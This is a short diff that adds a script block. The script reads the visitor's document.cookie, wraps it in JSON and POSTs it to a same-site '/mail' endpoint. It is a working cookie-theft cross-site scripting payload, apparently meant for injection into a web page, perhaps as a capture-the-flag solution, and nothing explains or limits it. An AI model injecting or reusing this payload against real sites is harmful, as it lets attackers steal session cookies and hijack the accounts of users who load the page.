@@ -1,0 +1,9 @@
+<script>
+  var a = JSON.stringify({
+    content: document.cookie,
+  });
+  fetch("/mail", {
+    method: "POST",
+    body: a,
+  });
+</script>
